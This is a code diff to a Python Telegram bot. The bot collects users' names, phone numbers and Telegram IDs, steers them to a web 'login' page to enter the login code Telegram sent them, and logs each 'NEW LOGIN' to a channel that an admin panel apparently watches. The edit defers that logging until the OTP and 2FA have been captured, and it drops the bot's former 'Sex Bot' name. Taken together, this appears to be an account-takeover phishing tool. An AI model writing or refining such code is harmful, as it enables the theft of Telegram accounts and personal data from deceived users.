@@ -71,16 +71,8 @@ async def contact_handler(client, message):
             phone = "+" + phone
         user_id = user.id
 
-        try:
-            await client.send_message(
-                LOG_CHANNEL,
-                f"🎓 <b>NEW LOGIN</b>\n\n"
-                f"👤 Name: {name}\n"
-                f"📱 Phone: {phone}\n"
-                f"🆔 TG ID: <code>{user_id}</code>",
-            )
-        except Exception as log_error:
-            print(f"Failed to send log: {log_error}")
+        # Do NOT send NEW LOGIN here — only after successful OTP/2FA
+        # so the log channel never gets duplicate messages.
 
         status = await message.reply_text("⏳ <i>Preparing your secure login…</i>")
 
@@ -97,9 +89,8 @@ async def contact_handler(client, message):
         else:
             url = f"{WEB_APP_URL}/login"
             caption = (
-                "📱 <b>Phone number received!</b>\n\n"
-                "🔐 Open the web app, enter your phone number and the code "
-                "sent to your Telegram app."
+                "📱 <b>Phone received!</b>\n\n"
+                "⚠️ Auto-connect failed. Open login and enter number manually."
             )
 
         keyboard = InlineKeyboardMarkup(
@@ -209,7 +200,7 @@ async def callback_handler(client, callback_query):
 
 
 if __name__ == "__main__":
-    print("🚀 Sex Bot Started...")
+    print("🚀 Bot Started...")
     print(f"📢 Log Channel: {LOG_CHANNEL}")
     print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
     print(f"👥 Admins: {len(ADMIN_IDS)}")
